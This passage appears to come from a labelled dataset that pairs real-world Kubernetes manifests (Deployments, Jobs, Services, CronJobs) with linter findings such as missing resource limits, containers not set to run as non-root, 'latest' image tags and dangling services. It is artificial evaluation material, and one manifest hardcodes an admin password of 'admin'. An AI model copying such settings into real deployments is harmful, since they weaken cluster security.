httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "11295",
    "manifest_path": "data/manifests/the_stack_sample/sample_4358.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: lb\nspec:\n  type: LoadBalancer\n  ports:\n  - name: http-port\n    protocol: TCP\n    port: 8080\n    targetPort: 80\n    nodePort: 30080\n  selector:\n    app: nginx\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx])"
  },
  {
    "id": "11296",
    "manifest_path": "data/manifests/the_stack_sample/sample_4360.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: gateway\n  name: gateway\n  namespace: springcloud\nspec:\n  type: NodePort\n  ports:\n  - port: 4000\n    protocol: TCP\n    targetPort: 4000\n    nodePort: 30010\n  selector:\n    name: gateway\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:gateway])"
  },
  {
    "id": "11297",
    "manifest_path": "data/manifests/the_stack_sample/sample_4361.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: create-new-site-prsite.localhost\n  namespace: erpnext\nspec:\n  template:\n    spec:\n      securityContext:\n        supplementalGroups:\n        - 1000\n      containers:\n      - name: create-site\n        image: frappe/erpnext-worker:v12.19.0\n        args:\n        - new\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: sites-dir\n          mountPath: /home/frappe/frappe-bench/sites\n        env:\n        - name: SITE_NAME\n          value: prsite.localhost\n        - name: DB_ROOT_USER\n          value: root\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mariadb-root-password\n        - name: ADMIN_PASSWORD\n          value: admin\n      volumes:\n      - name: sites-dir\n        persistentVolumeClaim:\n          claimName: erpnext-pr\n          readOnly: false\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11298",
    "manifest_path": "data/manifests/the_stack_sample/sample_4361.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: create-new-site-prsite.localhost\n  namespace: erpnext\nspec:\n  template:\n    spec:\n      securityContext:\n        supplementalGroups:\n        - 1000\n      containers:\n      - name: create-site\n        image: frappe/erpnext-worker:v12.19.0\n        args:\n        - new\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: sites-dir\n          mountPath: /home/frappe/frappe-bench/sites\n        env:\n        - name: SITE_NAME\n          value: prsite.localhost\n        - name: DB_ROOT_USER\n          value: root\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mariadb-root-password\n        - name: ADMIN_PASSWORD\n          value: admin\n      volumes:\n      - name: sites-dir\n        persistentVolumeClaim:\n          claimName: erpnext-pr\n          readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"create-site\" does not have a read-only root file system"
  },
  {
    "id": "11299",
    "manifest_path": "data/manifests/the_stack_sample/sample_4361.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: create-new-site-prsite.localhost\n  namespace: erpnext\nspec:\n  template:\n    spec:\n      securityContext:\n        supplementalGroups:\n        - 1000\n      containers:\n      - name: create-site\n        image: frappe/erpnext-worker:v12.19.0\n        args:\n        - new\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: sites-dir\n          mountPath: /home/frappe/frappe-bench/sites\n        env:\n        - name: SITE_NAME\n          value: prsite.localhost\n        - name: DB_ROOT_USER\n          value: root\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mariadb-root-password\n        - name: ADMIN_PASSWORD\n          value: admin\n      volumes:\n      - name: sites-dir\n        persistentVolumeClaim:\n          claimName: erpnext-pr\n          readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"create-site\" is not set to runAsNonRoot"
  },
  {
    "id": "11300",
    "manifest_path": "data/manifests/the_stack_sample/sample_4361.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: create-new-site-prsite.localhost\n  namespace: erpnext\nspec:\n  template:\n    spec:\n      securityContext:\n        supplementalGroups:\n        - 1000\n      containers:\n      - name: create-site\n        image: frappe/erpnext-worker:v12.19.0\n        args:\n        - new\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: sites-dir\n          mountPath: /home/frappe/frappe-bench/sites\n        env:\n        - name: SITE_NAME\n          value: prsite.localhost\n        - name: DB_ROOT_USER\n          value: root\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mariadb-root-password\n        - name: ADMIN_PASSWORD\n          value: admin\n      volumes:\n      - name: sites-dir\n        persistentVolumeClaim:\n          claimName: erpnext-pr\n          readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"create-site\" has cpu request 0"
  },
  {
    "id": "11301",
    "manifest_path": "data/manifests/the_stack_sample/sample_4361.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: create-new-site-prsite.localhost\n  namespace: erpnext\nspec:\n  template:\n    spec:\n      securityContext:\n        supplementalGroups:\n        - 1000\n      containers:\n      - name: create-site\n        image: frappe/erpnext-worker:v12.19.0\n        args:\n        - new\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: sites-dir\n          mountPath: /home/frappe/frappe-bench/sites\n        env:\n        - name: SITE_NAME\n          value: prsite.localhost\n        - name: DB_ROOT_USER\n          value: root\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mariadb-root-password\n        - name: ADMIN_PASSWORD\n          value: admin\n      volumes:\n      - name: sites-dir\n        persistentVolumeClaim:\n          claimName: erpnext-pr\n          readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"create-site\" has memory limit 0"
  },
  {
    "id": "11302",
    "manifest_path": "data/manifests/the_stack_sample/sample_4362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gym-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gym-app\n  template:\n    metadata:\n      labels:\n        app: gym-app\n    spec:\n      containers:\n      - name: gym-app\n        image: geekspace/gym-app:v0.0.12\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - secretRef:\n            name: gymapp\n        - configMapRef:\n            name: gymapp-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gym-app\" does not have a read-only root file system"
  },
  {
    "id": "11303",
    "manifest_path": "data/manifests/the_stack_sample/sample_4362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gym-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gym-app\n  template:\n    metadata:\n      labels:\n        app: gym-app\n    spec:\n      containers:\n      - name: gym-app\n        image: geekspace/gym-app:v0.0.12\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - secretRef:\n            name: gymapp\n        - configMapRef:\n            name: gymapp-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gym-app\" is not set to runAsNonRoot"
  },
  {
    "id": "11304",
    "manifest_path": "data/manifests/the_stack_sample/sample_4362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gym-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gym-app\n  template:\n    metadata:\n      labels:\n        app: gym-app\n    spec:\n      containers:\n      - name: gym-app\n        image: geekspace/gym-app:v0.0.12\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - secretRef:\n            name: gymapp\n        - configMapRef:\n            name: gymapp-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gym-app\" has cpu request 0"
  },
  {
    "id": "11305",
    "manifest_path": "data/manifests/the_stack_sample/sample_4362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gym-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gym-app\n  template:\n    metadata:\n      labels:\n        app: gym-app\n    spec:\n      containers:\n      - name: gym-app\n        image: geekspace/gym-app:v0.0.12\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - secretRef:\n            name: gymapp\n        - configMapRef:\n            name: gymapp-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gym-app\" has memory limit 0"
  },
  {
    "id": "11306",
    "manifest_path": "data/manifests/the_stack_sample/sample_4363.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis\" is using an invalid container image, \"redis\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11307",
    "manifest_path": "data/manifests/the_stack_sample/sample_4363.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11308",
    "manifest_path": "data/manifests/the_stack_sample/sample_4363.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "11309",
    "manifest_path": "data/manifests/the_stack_sample/sample_4363.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "11310",
    "manifest_path": "data/manifests/the_stack_sample/sample_4363.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "11311",
    "manifest_path": "data/manifests/the_stack_sample/sample_4363.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "11312",
    "manifest_path": "data/manifests/the_stack_sample/sample_4364.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: deployments-pruner\n  namespace: openshift-sre-pruning\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sre-pruner-sa\n        containers:\n        - name: deployments-pruner\n          image: image-registry.openshift-image-registry.svc:5000/openshift/cli:latest\n          imagePullPolicy: Always\n          command:\n          - oc\n          - adm\n          - prune\n          - deployments\n          - --keep-complete=1\n          - --keep-younger-than=24h\n          - --keep-failed=1\n          - --confirm\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"deployments-pruner\" is using an invalid container image, \"image-registry.openshift-image-registry.svc:5000/openshift/cli:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11313",
    "manifest_path": "data/manifests/the_stack_sample/sample_4364.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: deployments-pruner\n  namespace: openshift-sre-pruning\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sre-pruner-sa\n        containers:\n        - name: deployments-pruner\n          image: image-registry.openshift-image-registry.svc:5000/openshift/cli:latest\n          imagePullPolicy: Always\n          command:\n          - oc\n          - adm\n          - prune\n          - deployments\n          - --keep-complete=1\n          - --keep-younger-than=24h\n          - --keep-failed=1\n          - --confirm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deployments-pruner\" does not have a read-only root file system"
  },
  {
    "id": "11314",
    "manifest_path": "data/manifests/the_stack_sample/sample_4364.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: deployments-pruner\n  namespace: openshift-sre-pruning\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sre-pruner-sa\n        containers:\n        - name: deployments-pruner\n          image: image-registry.openshift-image-registry.svc:5000/openshift/cli:latest\n          imagePullPolicy: Always\n          command:\n          - oc\n          - adm\n          - prune\n          - deployments\n          - --keep-complete=1\n          - --keep-younger-than=24h\n          - --keep-failed=1\n          - --confirm\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"sre-pruner-sa\" not found"
  },
  {
    "id": "11315",
    "manifest_path": "data/manifests/the_stack_sample/sample_4364.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: deployments-pruner\n  namespace: openshift-sre-pruning\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sre-pruner-sa\n        containers:\n        - name: deployments-pruner\n          image: image-registry.openshift-image-registry.svc:5000/openshift/cli:latest\n          imagePullPolicy: Always\n          command:\n          - oc\n          - adm\n          - prune\n          - deployments\n          - --keep-complete=1\n          - --keep-younger-than=24h\n          - --keep-failed=1\n          - --confirm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deployments-pruner\" is not set to runAsNonRoot"
  },
  {
    "id": "11316",
    "manifest_path": "data/manifests/the_stack_sample/sample_4364.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: deployments-pruner\n  namespace: openshift-sre-pruning\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sre-pruner-sa\n        containers:\n        - name: deployments-pruner\n          image: image-registry.openshift-image-registry.svc:5000/openshift/cli:latest\n          imagePullPolicy: Always\n          command:\n          - oc\n          - adm\n          - prune\n          - deployments\n          - --keep-complete=1\n          - --keep-younger-than=24h\n          - --keep-failed=1\n          - --confirm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deployments-pruner\" has cpu request 0"
  },
  {
    "id": "11317",
    "manifest_path": "data/manifests/the_stack_sample/sample_4364.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: deployments-pruner\n  namespace: openshift-sre-pruning\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sre-pruner-sa\n        containers:\n        - name: deployments-pruner\n          image: image-registry.openshift-image-registry.svc:5000/openshift/cli:latest\n          imagePullPolicy: Always\n          command:\n          - oc\n          - adm\n          - prune\n          - deployments\n          - --keep-complete=1\n          - --keep-younger-than=24h\n          - --keep-failed=1\n          - --confirm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deployments-pruner\" has memory limit 0"
  },
  {
    "id": "11318",
    "manifest_path": "data/manifests/the_stack_sample/sample_4365.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-tools\n  namespace: rook-ceph\n  labels:\n    app: rook-ceph-tools\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-ceph-tools\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-tools\n    spec:\n      containers:\n      - name: rook-ceph-tools\n        image: rook/ceph:v1.5.4\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        volumeMounts:\n        - mountPath: /etc/ceph\n          name: ceph-config\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n      - name: ceph-config\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rook-ceph-tools\" does not have a read-only root file system"
  },
  {
    "id": "11319",
    "manifest_path": "data/manifests/the_stack_sample/sample_4365.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-tools\n  namespace: rook-ceph\n  labels:\n    app: rook-ceph-tools\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-ceph-tools\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-tools\n    spec:\n      containers:\n      - name: rook-ceph-tools\n        image: rook/ceph:v1.5.4\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        volumeMounts:\n        - mountPath: /etc/ceph\n          name: ceph-config\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n      - name: ceph-config\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rook-ceph-tools\" is not set to runAsNonRoot"
  },
  {
    "id": "11320",
    "manifest_path": "data/manifests/the_stack_sample/sample_4365.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-tools\n  namespace: rook-ceph\n  labels:\n    app: rook-ceph-tools\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-ceph-tools\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-tools\n    spec:\n      containers:\n      - name: rook-ceph-tools\n        image: rook/ceph:v1.5.4\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        volumeMounts:\n        - mountPath: /etc/ceph\n          name: ceph-config\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n      - name: ceph-config\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rook-ceph-tools\" has cpu request 0"
  },
  {
    "id": "11321",
    "manifest_path": "data/manifests/the_stack_sample/sample_4365.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-tools\n  namespace: rook-ceph\n  labels:\n    app: rook-ceph-tools\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-ceph-tools\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-tools\n    spec:\n      containers:\n      - name: rook-ceph-tools\n        image: rook/ceph:v1.5.4\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        volumeMounts:\n        - mountPath: /etc/ceph\n          name: ceph-config\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n      - name: ceph-config\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rook-ceph-tools\" has memory limit 0"
  },
  {
    "id": "11322",
    "manifest_path": "data/manifests/the_stack_sample/sample_4366.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: test-pod\nspec:\n  containers:\n  - name: base\n    image: perl\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - 'echo {\\\"hello\\\" : \\\"world\\\"} | cat > /airflow/xcom/return.json'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"base\" is using an invalid container image, \"perl\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11323",
    "manifest_path": "data/manifests/the_stack_sample/sample_4366.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: test-pod\nspec:\n  containers:\n  - name: base\n    image: perl\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - 'echo {\\\"hello\\\" : \\\"world\\\"} | cat > /airflow/xcom/return.json'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"base\" does not have a read-only root file system"
  },
  {
    "id": "11324",
    "manifest_path": "data/manifests/the_stack_sample/sample_4366.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: test-pod\nspec:\n  containers:\n  - name: base\n    image: perl\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - 'echo {\\\"hello\\\" : \\\"world\\\"} | cat > /airflow/xcom/return.json'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"base\" is not set to runAsNonRoot"
  },
  {
    "id": "11325",
    "manifest_path": "data/manifests/the_stack_sample/sample_4366.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: test-pod\nspec:\n  containers:\n  - name: base\n    image: perl\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - 'echo {\\\"hello\\\" : \\\"world\\\"} | cat > /airflow/xcom/return.json'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"base\" has cpu request 0"
  },
  {
    "id": "11326",
    "manifest_path": "data/manifests/the_stack_sample/sample_4366.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: test-pod\nspec:\n  containers:\n  - name: base\n    image: perl\n    command:\n    - /bin/bash\n    args:\n    - -c\n    - 'echo {\\\"hello\\\" : \\\"world\\\"} | cat > /airflow/xcom/return.json'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"base\" has memory limit 0"
  },
  {
    "id": "11327",
    "manifest_path": "data/manifests/the_stack_sample/sample_4367.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-loadbalancer\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    app: nginx\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx])"
  },
  {
    "id": "11328",
    "manifest_path": "data/manifests/the_stack_sample/sample_4368.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.1.51\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 1fd0005407ac7f67ebab2661d3da5128baef8d555cbbf8f197066258f8b8f406\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.1.51\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.192.168.71.62.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.51\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 78ee09edfc1815a0057f1df4a3749b0dba55c117\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-tekton-controller\" does not have a read-only root file system"
  },
  {
    "id": "11329",
    "manifest_path": "data/manifests/the_stack_sample/sample_4368.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.1.51\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 1fd0005407ac7f67ebab2661d3da5128baef8d555cbbf8f197066258f8b8f406\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.1.51\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.192.168.71.62.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.51\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: 